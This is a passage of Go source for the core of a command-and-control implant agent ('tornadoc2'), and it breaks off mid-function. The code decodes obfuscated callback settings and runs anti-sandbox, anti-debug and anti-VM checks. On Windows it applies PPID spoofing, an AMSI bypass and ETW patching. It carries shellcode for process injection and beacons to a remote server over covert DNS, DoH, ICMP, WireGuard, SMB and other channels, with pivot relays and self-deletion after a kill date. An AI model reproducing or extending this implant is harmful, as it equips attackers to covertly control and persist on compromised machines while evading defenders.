package core

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	crand "crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"tornadoc2/agent/crypto"
	"tornadoc2/agent/evasion"
	"tornadoc2/agent/features"
	"tornadoc2/agent/native"
	"tornadoc2/agent/platform"
	"tornadoc2/agent/protocol"
	"tornadoc2/agent/transport"
)

var (
	DefaultURL       string
	DefaultProfile   string
	ServerPubKeyPem  string
	ClientCertPem    string
	ClientKeyPem     string
	RootCAPem        string
	ProfileJSON      string
	AgentPrivKeyPem  string

	TransportMode string
	DNSDomain     string
	DNSResolver   string
	ICMPHost      string
	DoHResolver   string
	DoHHostHeader string
	DoHUserAgent  string

	WebSocketURL string

	WireGuardServerPubKey string
	WireGuardServerAddr   string
	WireGuardAgentPrivKey string
	WireGuardTunnelIP     string
	WireGuardServerTunnelIP string
	WireGuardInnerPort string

	SMBPipe      string
	SMBRelayPipe string

	TCPBindAddr    string
	TCPBindToken   string
	TCPRelayTarget string
	TCPRelayToken  string

	TCPRevListen string
	TCPRevTarget string
	TCPRevToken  string

	ServerECDHPubkey string
	ObfKeyHex        string
	SleepMaskType    string
	SyscallMethod    string

	PivotPrivKeyB64 string
	PivotPubKeyB64  string

	InjectorShellcodeB64 string

	// InjectMethodDefault is set at build time via
	// -X main.InjectMethodDefault=<name>. Empty or "default"
	// selects the historical CreateRemoteThread / ptrace
	// backend. "apc" selects remote APC injection on Windows;
	// it is refused on Linux by inject_linux.go.
	InjectMethodDefault string

	DefaultSleepSeconds    int     = 60
	DefaultJitter          float64 = 0.3
	KillDays               int     = 30
	TransportFailoverAfter int     = 3
	AntiSandboxEnabled     bool    = false
	SleepMaskEnabled       bool    = false
	AmsiBypass             bool    = false
	EtwPatch               bool    = false
	StringObfuscation      bool    = false
	PpidSpoof              bool    = false
	AntiDebug              bool    = false
	AntiVm                 bool    = false
	Verbose                bool    = false
)

func deobf(encoded string, keyHex string) string {
	if encoded == "" || keyHex == "" {
		return encoded
	}
	key, err := hex.DecodeString(keyHex)
	if err != nil || len(key) == 0 {
		return encoded
	}
	raw, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return encoded
	}
	out := make([]byte, len(raw))
	for i := range raw {
		out[i] = raw[i] ^ key[i%len(key)]
	}
	return string(out)
}

func diag(format string, args ...interface{}) {
	if !Verbose {
		return
	}
	ts := time.Now().Format("15:04:05.000")
	fmt.Fprintf(os.Stderr, ts+" "+format, args...)
}

func Main(cfg Config) {
	diag("[core] === agent starting ===\n")
	diag("[core] target os=%s arch=%s\n",
		runtime.GOOS, runtime.GOARCH)

	DefaultURL       = cfg.DefaultURL
	DefaultProfile   = cfg.DefaultProfile
	ServerPubKeyPem  = cfg.ServerPubKeyPem
	ClientCertPem    = cfg.ClientCertPem
	ClientKeyPem     = cfg.ClientKeyPem
	RootCAPem        = cfg.RootCAPem
	ProfileJSON      = cfg.ProfileJSON
	AgentPrivKeyPem  = cfg.AgentPrivKeyPem

	TransportMode = cfg.TransportMode
	DNSDomain     = cfg.DNSDomain
	DNSResolver   = cfg.DNSResolver
	ICMPHost      = cfg.ICMPHost
	DoHResolver   = cfg.DoHResolver
	DoHHostHeader = cfg.DoHHostHeader
	DoHUserAgent  = cfg.DoHUserAgent

	WebSocketURL = cfg.WebSocketURL

	WireGuardServerPubKey = cfg.WireGuardServerPubKey
	WireGuardServerAddr   = cfg.WireGuardServerAddr
	WireGuardAgentPrivKey = cfg.WireGuardAgentPrivKey
	WireGuardTunnelIP     = cfg.WireGuardTunnelIP
	WireGuardServerTunnelIP = cfg.WireGuardServerTunnelIP
	WireGuardInnerPort    = cfg.WireGuardInnerPort

	SMBPipe      = cfg.SMBPipe
	SMBRelayPipe = cfg.SMBRelayPipe

	TCPBindAddr    = cfg.TCPBindAddr
	TCPBindToken   = cfg.TCPBindToken
	TCPRelayTarget = cfg.TCPRelayTarget
	TCPRelayToken  = cfg.TCPRelayToken

	TCPRevListen = cfg.TCPRevListen
	TCPRevTarget = cfg.TCPRevTarget
	TCPRevToken  = cfg.TCPRevToken

	ServerECDHPubkey = cfg.ServerECDHPubkey
	ObfKeyHex        = cfg.ObfKeyHex
	SleepMaskType    = cfg.SleepMaskType
	SyscallMethod    = cfg.SyscallMethod

	PivotPrivKeyB64 = cfg.PivotPrivKeyB64
	PivotPubKeyB64  = cfg.PivotPubKeyB64

	InjectorShellcodeB64 = cfg.InjectorShellcodeB64
	InjectMethodDefault  = cfg.InjectMethod

	DefaultSleepSeconds    = cfg.DefaultSleepSeconds
	DefaultJitter          = cfg.DefaultJitter
	KillDays               = cfg.KillDays
	TransportFailoverAfter = cfg.TransportFailoverAfter
	protocol.WorkHoursStart = cfg.WorkHoursStart
	protocol.WorkHoursEnd   = cfg.WorkHoursEnd
	protocol.WireTLSProfile = cfg.TLSProfile

	protocol.DNSVerbB            = cfg.DNSVerbB
	protocol.DNSVerbT            = cfg.DNSVerbT
	protocol.DNSVerbR            = cfg.DNSVerbR
	protocol.DNSPayloadChunkSize = cfg.DNSPayloadChunkSize

	AntiSandboxEnabled = cfg.AntiSandbox
	SleepMaskEnabled   = cfg.SleepMask
	AmsiBypass         = cfg.AmsiBypass
	EtwPatch           = cfg.EtwPatch
	StringObfuscation  = cfg.StringObfuscation
	PpidSpoof          = cfg.PpidSpoof
	AntiDebug          = cfg.AntiDebug
	AntiVm             = cfg.AntiVM
	Verbose            = cfg.Verbose

	diag("[core] config: transport=%q url=%q dns_zone=%q "+
		"icmp_host=%q smb_pipe=%q tcp_bind=%q ws_url=%q\n",
		TransportMode, DefaultURL, DNSDomain,
		ICMPHost, SMBPipe, TCPBindAddr, WebSocketURL)
	diag("[core] config: wg_server_addr=%q wg_tunnel_ip=%q "+
		"wg_has_pubkey=%v wg_has_privkey=%v\n",
		WireGuardServerAddr, WireGuardTunnelIP,
		WireGuardServerPubKey != "", WireGuardAgentPrivKey != "")
	diag("[core] config: tls_profile=%q kill_days=%d "+
		"work_hours=%02d:%02d-%02d:%02d failover_after=%d\n",
		cfg.TLSProfile, KillDays,
		protocol.WorkHoursStart/60, protocol.WorkHoursStart%60,
		protocol.WorkHoursEnd/60, protocol.WorkHoursEnd%60,
		TransportFailoverAfter)
	diag("[core] config: server_pubkey=%v agent_privkey=%v "+
		"server_ecdh=%v pivot_priv=%v pivot_pub=%v\n",
		ServerPubKeyPem != "", AgentPrivKeyPem != "",
		ServerECDHPubkey != "", PivotPrivKeyB64 != "",
		PivotPubKeyB64 != "")
	diag("[core] config: inject_shellcode=%v inject_method=%q\n",
		InjectorShellcodeB64 != "", InjectMethodDefault)
	diag("[core] config: opsec antisanbox=%v sleepmask=%q "+
		"amsi=%v etw=%v ppid=%v antidebug=%v antivm=%v\n",
		AntiSandboxEnabled, SleepMaskType, AmsiBypass,
		EtwPatch, PpidSpoof, AntiDebug, AntiVm)

	evasion.SetSyscallMethod(SyscallMethod)

	if ObfKeyHex != "" {
		diag("[core] deobfuscating %d values with key\n",
			len(ObfKeyHex)/2)
		DefaultURL = deobf(DefaultURL, ObfKeyHex)
		ProfileJSON = deobf(ProfileJSON, ObfKeyHex)
		ICMPHost = deobf(ICMPHost, ObfKeyHex)
		DoHResolver = deobf(DoHResolver, ObfKeyHex)
		DoHHostHeader = deobf(DoHHostHeader, ObfKeyHex)
		DoHUserAgent = deobf(DoHUserAgent, ObfKeyHex)
		WebSocketURL = deobf(WebSocketURL, ObfKeyHex)
		diag("[core] deobfuscated url=%q\n", DefaultURL)
	}

	diag("[core] running OPSEC checks\n")
	if AntiSandboxEnabled {
		if evasion.SandboxDetected() {
			diag("[core] sandbox detected — sleeping then checking again\n")
			sleep := time.Duration(4+rand.Intn(4)) * time.Hour
			time.Sleep(sleep)
			if evasion.SandboxDetected() {
				diag("[core] sandbox still detected — exiting\n")
				os.Exit(0)
			}
		}
		diag("[core] sandbox check passed\n")
	}
	if AntiDebug {
		if evasion.DebuggerDetected() {
			diag("[core] debugger detected — exiting\n")
			os.Exit(0)
		}
		diag("[core] debugger check passed\n")
	}
	if AntiVm {
		if evasion.InVM() {
			diag("[core] VM detected — exiting\n")
			os.Exit(0)
		}
		diag("[core] VM check passed\n")
	}
	if runtime.GOOS == "windows" {
		if PpidSpoof {
			diag("[core] attempting PPID spoof\n")
			spawned, err := evasion.PPIDSpoof()
			if err == nil && spawned {
				diag("[core] PPID spoof respawned — parent exiting\n")
				os.Exit(0)
			}
		}
		if AmsiBypass || EtwPatch {
			diag("[core] applying Windows evasion amsi=%v etw=%v\n",
				AmsiBypass, EtwPatch)
			evasion.ApplyWindowsEvasion(AmsiBypass, EtwPatch)
		}
	}

	diag("[core] constructing agent\n")
	agent, err := newAgent(cfg)
	if err != nil {
		diag("[core] agent construction failed: %v\n", err)
		os.Exit(1)
	}
	diag("[core] agent constructed: %d transport(s) %v\n",
		len(agent.transports), agent.transportNames)

	signalMigrateReady()
	diag("[core] migrate-ready signal sent (no-op if not migrated)\n")

	if SMBRelayPipe != "" {
		diag("[core] starting SMB pivot listener on %q\n",
			SMBRelayPipe)
		if agent.pivotPriv == nil {
			diag("[core] smb pivot listener requires pivot " +
				"private key; not started\n")
		} else {
			relay, err := newSMBRelay(agent, SMBRelayPipe,
				agent.pivotPriv)
			if err != nil {
				diag("[core] smb pivot: %v\n", err)
			} else if err := relay.start(); err != nil {
				diag("[core] smb pivot failed to start: %v\n", err)
			} else {
				diag("[core] smb pivot listening\n")
			}
		}
	}
	if TCPRelayTarget != "" {
		diag("[core] starting TCP pivot listener target=%q\n",
			TCPRelayTarget)
		if TCPRelayToken == "" {
			diag("[core] tcp pivot: no token; skipping\n")
		} else if agent.pivotPriv == nil {
			diag("[core] tcp pivot listener requires pivot " +
				"private key; not started\n")
		} else {
			relay := newTCPRelay(agent, TCPRelayTarget,
				TCPRelayToken, agent.pivotPriv)
			if err := relay.start(); err != nil {
				diag("[core] tcp pivot failed: %v\n", err)
			}
		}
	}
	if TCPRevListen != "" {
		diag("[core] starting TCP reverse pivot listener on %q\n",
			TCPRevListen)
		if TCPRevToken == "" {
			diag("[core] tcp reverse pivot: no token; " +
				"skipping\n")
		} else if agent.pivotPriv == nil {
			diag("[core] tcp reverse pivot listener requires " +
				"pivot private key; not started\n")
		} else {
			relay, err := newTCPRevRelay(agent, TCPRevListen,
				TCPRevToken, agent.pivotPriv)
			if err != nil {
				diag("[core] tcp reverse pivot: %v\n", err)
			} else if err := relay.start(); err != nil {
				diag("[core] tcp reverse pivot failed: %v\n",
					err)
			}
		}
	}

	diag("[core] entering agent run loop\n")
	agent.run()
	diag("[core] agent run loop returned — exiting\n")
}

type Agent struct {
	cfg Config

	transports        []protocol.Transport
	transportNames    []string
	transportIndex    int
	transport         protocol.Transport
	transportFailures int

	session  protocol.CheckinResponse
	identity protocol.Identity
	profile  protocol.Profile
	deadline time.Time

	serverPub *ecdsa.PublicKey
	agentPriv *ecdsa.PrivateKey
	wire      *crypto.WireSession
	shaping   *features.ShapingSpec
	signMu    sync.Mutex
	rngMu     sync.Mutex
	rng       *rand.Rand

	relayClientOnce sync.Once
	relayClientInst *http.Client

	pivotPriv *ecdsa.PrivateKey
	pivotPub  *ecdsa.PublicKey
}

func newAgent(cfg Config) (*Agent, error) {
	diag("[agent] newAgent starting\n")
	a := &Agent{
		cfg: cfg,
		rng: rand.New(rand.NewSource(time.Now().UnixNano())),
	}

	var pivotPriv *ecdsa.PrivateKey
	var pivotPub *ecdsa.PublicKey
	if PivotPrivKeyB64 != "" {
		diag("[agent] parsing pivot private key\n")
		der, err := base64.StdEncoding.DecodeString(PivotPrivKeyB64)
		if err != nil {
			return nil, fmt.Errorf("pivot priv key b64: %w", err)
		}
		k, err := x509.ParsePKCS8PrivateKey(der)
		if err != nil {
			return nil, fmt.Errorf("pivot priv key parse: %w", err)
		}
		ec, ok := k.(*ecdsa.PrivateKey)
		if !ok {
			return nil, errors.New("pivot priv key is not ECDSA")
		}
		pivotPriv = ec
		diag("[agent] pivot private key loaded\n")
	}
	if PivotPubKeyB64 != "" {
		diag("[agent] parsing pivot public key\n")
		der, err := base64.StdEncoding.DecodeString(PivotPubKeyB64)
		if err != nil {
			return nil, fmt.Errorf("pivot pub key b64: %w", err)
		}
		k, err := x509.ParsePKIXPublicKey(der)
		if err != nil {
			return nil, fmt.Errorf("pivot pub key parse: %w", err)
		}
		ec, ok := k.(*ecdsa.PublicKey)
		if !ok {
			return nil, errors.New("pivot pub key is not ECDSA")
		}
		pivotPub = ec
		diag("[agent] pivot public key loaded\n")
	}
	a.pivotPriv = pivotPriv
	a.pivotPub = pivotPub

	diag("[agent] loading C2 profile\n")
	a.profile = defaultProfile()

	profileBlob := []byte(ProfileJSON)
	if ProfileJSON != "" {
		if err := json.Unmarshal([]byte(ProfileJSON), &a.profile); err != nil {
			if raw, derr := base64.StdEncoding.DecodeString(ProfileJSON); derr == nil {
				profileBlob = raw
				_ = json.Unmarshal(raw, &a.profile)
			}
		}
	}
	a.profile = a.profile.Resolved()
	diag("[agent] profile resolved: ua=%q beacon=%q tasks=%q "+
		"results=%q\n",
		a.profile.UserAgent, a.profile.BeaconPath,
		a.profile.TasksPath, a.profile.ResultsPath)

	if len(profileBlob) > 0 {
		diag("[agent] checking for shaping block\n")
		var raw map[string]json.RawMessage
		if err := json.Unmarshal(profileBlob, &raw); err == nil {
			if shRaw, ok := raw["shaping"]; ok {
				var sh features.ShapingSpec
				if err := json.Unmarshal(shRaw, &sh); err != nil {
					return nil, fmt.Errorf(
						"embedded shaping block is malformed: %w", err)
				}
				if err := features.ValidateShapingSpec(&sh); err != nil {
					return nil, fmt.Errorf(
						"embedded shaping block is invalid: %w", err)
				}
				a.shaping = &sh
				diag("[agent] shaping block validated\n")
			}
		}
	}

	if ServerPubKeyPem != "" {
		diag("[agent] parsing embedded server public key\n")
		raw, err := base64.StdEncoding.DecodeString(ServerPubKeyPem)
		if err == nil {
			if pub := ParseECDSAPublicKey(raw); pub != nil {
				a.serverPub = pub
				diag("[agent] server public key loaded — task "+
					"signature verification enabled\n")
			} else {
				diag("[agent] server public key parse returned nil\n")
			}
		} else {
			diag("[agent] server public key b64 decode failed: %v\n",
				err)
		}
	} else {
		diag("[agent] no server public key embedded — task "+
			"signature verification disabled\n")
	}

	if AgentPrivKeyPem != "" {
		diag("[agent] parsing embedded agent private key\n")
		raw, err := base64.StdEncoding.DecodeString(AgentPrivKeyPem)
		if err == nil {
			if priv, err := parseECDSAPrivateKey(raw); err == nil {
				a.agentPriv = priv
				diag("[agent] agent signing key loaded — result "+
					"and identity signing enabled\n")
			} else {
				diag("[agent] agent private key parse failed: %v\n",
					err)
			}
		} else {
			diag("[agent] agent private key b64 decode failed: %v\n",
				err)
		}
	} else {
		diag("[agent] no agent signing key embedded — results "+
			"will be unsigned\n")
	}

	diag("[agent] creating wire encryption session\n")
	ws, err := crypto.NewWireSession(ServerECDHPubkey)
	if err != nil {
		return nil, fmt.Errorf("wire session: %w", err)
	}
	a.wire = ws
	if ws != nil {
		diag("[agent] wire encryption ENABLED (P-256 ECDH + "+
			"AES-256-GCM)\n")
	} else {
		diag("[agent] wire encryption DISABLED — plaintext mode\n")
	}

	if SMBPipe != "" && TCPBindAddr != "" {
		return nil, errors.New(
			"SMBPipe and TCPBindAddr are both set; the two " +
				"child transports are mutually exclusive. " +
				"Rebuild with only one.")
	}

	if SMBPipe != "" {
		diag("[agent] building SMB transport pipe=%q\n", SMBPipe)
		if TransportMode != "" && TransportMode != "smb" {
			return nil, errors.New(
				"SMBPipe set but TransportMode is not 'smb'; " +
					"the SMB transport has no fallback")
		}
		if pivotPub == nil {
			return nil, errors.New(
				"transport=smb requires the pivot public " +
					"key (set --pivot-key or " +
					"--pivot-key-gen at build time)")
		}
		a.identity = GatherIdentity(cfg)
		smbT, err := transport.NewSMBTransport(SMBPipe,
			a.agentPriv, pivotPub, a.identity, a.shaping)
		if err != nil {
			return nil, fmt.Errorf("smb transport: %w", err)
		}
		a.transports = append(a.transports, smbT)
		a.transportNames = append(a.transportNames, "smb")
		a.transportIndex = 0
		a.transport = a.transports[0]
		if KillDays > 0 {
			a.deadline = time.Now().Add(
				time.Duration(KillDays) * 24 * time.Hour)
			diag("[agent] kill deadline set: %s\n",
				a.deadline.Format(time.RFC3339))
		}
		diag("[agent] SMB transport ready\n")
		return a, nil
	}

	if TCPBindAddr != "" {
		diag("[agent] building TCP bind transport addr=%q\n",
			TCPBindAddr)
		if TransportMode != "" && TransportMode != "tcp" {
			return nil, errors.New(
				"TCPBindAddr set but TransportMode is not 'tcp'")
		}
		if TCPBindToken == "" {
			return nil, errors.New(
				"TCPBindAddr set but TCPBindToken is empty")
		}
		if pivotPub == nil {
			return nil, errors.New(
				"transport=tcp requires the pivot public key")
		}
		a.identity = GatherIdentity(cfg)
		tcpT, err := transport.NewTCPBindTransport(
			TCPBindAddr, TCPBindToken,
			a.agentPriv, pivotPub, a.identity, a.shaping)
		if err != nil {
			return nil, err
		}
		a.transports = append(a.transports, tcpT)
		a.transportNames = append(a.transportNames, "tcp")
		a.transportIndex = 0
		a.transport = a.transports[0]
		if KillDays > 0 {
			a.deadline = time.Now().Add(
				time.Duration(KillDays) * 24 * time.Hour)
			diag("[agent] kill deadline set: %s\n",
				a.deadline.Format(time.RFC3339))
		}
		diag("[agent] TCP bind transport ready\n")
		return a, nil
	}

	if TCPRevTarget != "" {
		diag("[agent] building TCP reverse transport target=%q\n",
			TCPRevTarget)
		if TransportMode != "" && TransportMode != "tcprev" {
			return nil, errors.New(
				"TCPRevTarget set but TransportMode is not 'tcprev'")
		}
		if TCPRevToken == "" {
			return nil, errors.New(
				"TCPRevTarget set but TCPRevToken is empty")
		}
		if pivotPub == nil {
			return nil, errors.New(
				"transport=tcprev requires the pivot public key")
		}
		a.identity = GatherIdentity(cfg)
		revT, err := transport.NewTCPRevTransport(
			TCPRevTarget, TCPRevToken,
			a.agentPriv, pivotPub, a.identity, a.shaping)
		if err != nil {
			return nil, fmt.Errorf(
				"tcp reverse transport: %w", err)
		}
		a.transports = append(a.transports, revT)
		a.transportNames = append(a.transportNames, "tcprev")
		a.transportIndex = 0
		a.transport = a.transports[0]
		if KillDays > 0 {
			a.deadline = time.Now().Add(
				time.Duration(KillDays) * 24 * time.Hour)
			diag("[agent] kill deadline set: %s\n",
				a.deadline.Format(time.RFC3339))
		}
		diag("[agent] TCP reverse transport ready\n")
		return a, nil
	}

	modes := splitTransportModes(TransportMode)
	if len(modes) == 0 {
		return nil, errors.New("no transport configured")
	}
	diag("[agent] transport modes: %v\n", modes)

	for _, mode := range modes {
		diag("[agent] building transport %q\n", mode)
		switch mode {
		case "dns":
			if DNSDomain == "" {
				return nil, errors.New("transport=dns but no DNSDomain")
			}
			dnsT, err := transport.NewDNSTransport(
				DNSDomain, DNSResolver)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, dnsT)
			a.transportNames = append(a.transportNames, "dns")
			diag("[agent] dns transport ready zone=%q resolver=%q\n",
				DNSDomain, DNSResolver)
		case "doh":
			if DNSDomain == "" {
				return nil, errors.New("transport=doh but no DNSDomain")
			}
			dohTLS, err := BuildDoHTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			dohT, err := transport.NewDoHTransport(
				DNSDomain, DoHResolver,
				DoHHostHeader, DoHUserAgent, dohTLS)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, dohT)
			a.transportNames = append(a.transportNames, "doh")
			diag("[agent] doh transport ready zone=%q resolver=%q\n",
				DNSDomain, DoHResolver)
		case "icmp":
			if runtime.GOOS == "windows" {
				return nil, errors.New(
					"transport=icmp is not implemented on Windows")
			}
			if ICMPHost == "" {
				return nil, errors.New("transport=icmp but no ICMPHost")
			}
			icmpT, err := transport.NewICMPTransport(ICMPHost)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, icmpT)
			a.transportNames = append(a.transportNames, "icmp")
			diag("[agent] icmp transport ready host=%q\n", ICMPHost)
		case "http":
			tlsCfg, err := BuildTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			httpT, err := transport.NewHTTPTransport(
				DefaultURL, a.profile, tlsCfg, a.shaping)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, httpT)
			a.transportNames = append(a.transportNames, "http")
			diag("[agent] http transport ready url=%q tls=%v\n",
				DefaultURL, tlsCfg != nil)
		case "quic":
			tlsCfg, err := BuildTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			quicT, err := transport.NewQUICTransport(
				DefaultURL, a.profile, tlsCfg, a.shaping)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, quicT)
			a.transportNames = append(a.transportNames, "quic")
			diag("[agent] quic transport ready url=%q\n", DefaultURL)
		case "websocket":
			url := WebSocketURL
			if url == "" {
				url = DefaultURL
			}
			if url == "" {
				return nil, errors.New(
					"transport=websocket but no callback URL " +
						"is embedded (WebSocketURL and " +
						"DefaultURL are both empty)")
			}
			tlsCfg, err := BuildTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			wsT, err := transport.NewWebSocketTransport(
				url, a.profile, tlsCfg, a.shaping)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, wsT)
			a.transportNames = append(a.transportNames, "websocket")
			diag("[agent] websocket transport ready url=%q tls=%v\n",
				url, tlsCfg != nil)
		case "wireguard":
			if WireGuardServerPubKey == "" {
				return nil, errors.New(
					"transport=wireguard requires " +
						"WireGuardServerPubKey")
			}
			if WireGuardServerAddr == "" {
				return nil, errors.New(
					"transport=wireguard requires " +
						"WireGuardServerAddr")
			}
			if WireGuardAgentPrivKey == "" {
				return nil, errors.New(
					"transport=wireguard requires " +
						"WireGuardAgentPrivKey")
			}
			if WireGuardTunnelIP == "" {
				return nil, errors.New(
					"transport=wireguard requires " +
						"WireGuardTunnelIP")
			}
			tlsCfg, err := BuildTLSConfig(cfg)
			if err != nil {
				return nil, err
			}
			wgT, err := transport.NewWireGuardTransport(
				WireGuardServerPubKey,
				WireGuardServerAddr,
				WireGuardAgentPrivKey,
				WireGuardTunnelIP,
				WireGuardInnerPort,
				WireGuardServerTunnelIP,
				a.profile, tlsCfg, a.shaping)
			if err != nil {
				return nil, err
			}
			a.transports = append(a.transports, wgT)
			a.transportNames = append(a.transportNames, "wireguard")
			diag("[agent] wireguard transport ready "+
				"server=%q tunnel=%q\n",
				WireGuardServerAddr, WireGuardTunnelIP)
		case "tcp":
			return nil, errors.New(
				"transport 'tcp' must be used alone, via TCPBindAddr")
		case "tcprev":
			return nil, errors.New(
				"transport 'tcprev' must be used alone, via TCPRevTarget")
		default:
			return nil, fmt.Errorf("unknown transport: %s", mode)
		}
	}
	a.transportIndex = 0
	a.transport = a.transports[0]

	if KillDays > 0 {
		a.deadline = time.Now().Add(
			time.Duration(KillDays) * 24 * time.Hour)
		diag("[agent] kill deadline set: %s\n",
			a.deadline.Format(time.RFC3339))
	}

	a.identity = GatherIdentity(cfg)
	diag("[agent] identity: host=%q user=%q machine_id=%q "+
		"os=%q arch=%q\n",
		a.identity.Hostname, a.identity.Username,
		truncate(a.identity.MachineID, 16),
		a.identity.OS, a.identity.Arch)
	diag("[agent] newAgent complete — %d transport(s)\n",
		len(a.transports))
	return a, nil
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func splitTransportModes(s string) []string {
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(strings.ToLower(p))
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

func (a *Agent) advanceTransport() {
	if len(a.transports) <= 1 {
		return
	}
	failures := a.transportFailures
	a.transportIndex = (a.transportIndex + 1) % len(a.transports)
	a.transport = a.transports[a.transportIndex]
	a.transportFailures = 0
	diag("[transport] failed %d consecutive times; "+
		"rotating to %q (index %d/%d)\n",
		failures, a.transportNames[a.transportIndex],
		a.transportIndex, len(a.transports))
}

func isTransportFailure(msg string) bool {
	markers := []string{
		"connection refused",
		"no such host",
		"i/o timeout",
		"certificate",
		"TLS handshake",
		"dial tcp",
		"dial udp",
		"EOF",
		"network is unreachable",
		"no route to host",
		"permission denied",
		"operation not permitted",
	}
	for _, m := range markers {
		if strings.Contains(msg, m) {
			return true
		}
	}
	return false
}

func (a *Agent) run() {
	initialDelay := time.Duration(2+a.rngIntn(16)) * time.Second
	diag("[run] waiting %v before first check-in\n", initialDelay)
	time.Sleep(initialDelay)

	backoff := time.Second * 5
	attempt := 0
	for {
		attempt++
		diag("[run] check-in attempt #%d (transport=%q)\n",
			attempt, a.transportNames[a.transportIndex])
		err := a.checkin()
		if err == nil {
			diag("[run] initial check-in succeeded on attempt #%d\n",
				attempt)
			break
		}
		diag("[run] check-in #%d failed: %v (retry in %v)\n",
			attempt, err, backoff)
		time.Sleep(backoff)
		if backoff < time.Minute*5 {
			backoff *= 2
		}
	}

	diag("[run] work hours: %s (local %02d:%02d)\n",
		formatWorkHours(), time.Now().Hour(), time.Now().Minute())

	loop := 0
	for {
		loop++
		diag("[run] loop iteration #%d\n", loop)

		if !a.deadline.IsZero() && time.Now().After(a.deadline) {
			diag("[run] kill deadline passed — self-deleting and exiting\n")
			_ = platform.SelfDelete()
			return
		}

		if !insideWorkHours(time.Now()) {
			diag("[run] outside work hours — sleeping 60s\n")
			for i := 0; i < 60; i++ {
				if !a.deadline.IsZero() &&
					time.Now().After(a.deadline) {
					break
				}
				time.Sleep(time.Second)
			}
			continue
		}

		a.pollAndRun()
		a.sleep()
	}
}

func (a *Agent) checkin() error {
	if a.session.ID != 0 {
		diag("[checkin] re-checking in (previous id %d)\n",
			a.session.ID)
	}

	a.identity.WorkStart = protocol.WorkHoursStart
	a.identity.WorkEnd   = protocol.WorkHoursEnd

	pubkey := ""
	var identitySig string
	var identityTs int64
	if a.agentPriv != nil {
		pubDER, err := x509.MarshalPKIXPublicKey(&a.agentPriv.PublicKey)
		if err == nil {
			pubPEM := pem.EncodeToMemory(&pem.Block{
				Type:  "PUBLIC KEY",
				Bytes: pubDER,
			})
			pubkey = string(pubPEM)

			identityTs = time.Now().Unix()
			payload := []byte(fmt.Sprintf(
				"%s|%s|%s|%s|%d",
				a.identity.MachineID,
				a.identity.Hostname,
				a.identity.Username,
				a.identity.OS,
				identityTs))
			sig, serr := SignPayload(a.agentPriv, payload)
			if serr == nil {
				identitySig = base64.StdEncoding.EncodeToString(sig)
				diag("[checkin] identity signature generated "+
					"(%d bytes)\n", len(sig))
			} else {
				diag("[checkin] identity signature failed: %v\n",
					serr)
			}
		} else {
			diag("[checkin] failed to marshal agent public key: %v\n",
				err)
		}
	} else {
		diag("[checkin] no agent private key — identity unsigned\n")
	}

	diag("[checkin] calling transport.CheckIn "+
		"identity_sig=%v identity_ts=%d wire=%v\n",
		identitySig != "", identityTs, a.wire != nil)
	t0 := time.Now()
	reply, err := a.transport.CheckIn(
		a.identity, pubkey, identitySig, identityTs, a.wire)
	elapsed := time.Since(t0)

	if err != nil {
		diag("[checkin] transport returned error after %v: %v\n",
			elapsed, err)
		if strings.Contains(err.Error(), "403") {
			diag("[checkin] 403 refusal — exiting\n")
			os.Exit(1)
		}
		if TransportFailoverAfter > 0 &&
			isTransportFailure(err.Error()) {
			a.transportFailures++
			diag("[checkin] transport failure #%d/%d\n",
				a.transportFailures, TransportFailoverAfter)
			if a.transportFailures >= TransportFailoverAfter {
				a.advanceTransport()
			}
		}
		return err
	}

	a.transportFailures = 0
	a.session = *reply
	diag("[checkin] SUCCESS in %v — session id=%d sleep=%d "+
		"jitter=%.2f proto=%d cookie=%v\n",
		elapsed, reply.ID, reply.Sleep, reply.Jitter,
		reply.Proto, reply.Cookie != "")
	return nil
}

func (a *Agent) pollAndRun() {
	diag("[poll] starting task fetch\n")
	t0 := time.Now()
	tasks, err := a.fetchTasks()
	elapsed := time.Since(t0)
	if err != nil {
		diag("[poll] fetch failed after %v: %v\n", elapsed, err)
		if TransportFailoverAfter > 0 &&
			isTransportFailure(err.Error()) {
			a.transportFailures++
			diag("[poll] transport failure #%d/%d\n",
				a.transportFailures, TransportFailoverAfter)
			if a.transportFailures >= TransportFailoverAfter {
				a.advanceTransport()
			}
		}

		msg := err.Error()
		should_recheck :=
			strings.Contains(msg, "status 400") ||
				strings.Contains(msg, "status 401") ||
				strings.Contains(msg, "status 403") ||
				strings.Contains(msg, "status 404") ||
				strings.Contains(msg, "status 500") ||
				strings.Contains(msg, "status 502") ||
				strings.Contains(msg, "status 503") ||
				strings.Contains(msg, "no session cookie") ||
				strings.Contains(msg, "connection refused") ||
				strings.Contains(msg, "no such host") ||
				strings.Contains(msg, "certificate") ||
				strings.Contains(msg, "invalid character") ||
				strings.Contains(msg, "i/o timeout")
		if should_recheck {
			diag("[poll] error matches re-check condition — "+
				"re-checking in\n")
			jitter := time.Duration(a.rngIntn(3000)) * time.Millisecond
			time.Sleep(jitter)
			if err := a.checkin(); err != nil {
				diag("[poll] re-check-in failed: %v\n", err)
			}
		}
		return
	}

	diag("[poll] fetch complete in %v — %d task(s)\n",
		elapsed, len(tasks))
	if len(tasks) == 0 {
		return
	}

	for i, t := range tasks {
		diag("[task %d/%d] id=%s verb=%s args=%v timeout=%d "+
			"signature=%v\n",
			i+1, len(tasks), t.ID, t.Verb, t.Args,
			t.Timeout, t.Signature != "")

		if t.ID == "" || t.Verb == "" {
			diag("[task %d] id or verb empty — skipping\n", i+1)
			continue
		}

		if !a.verifyTask(t) {
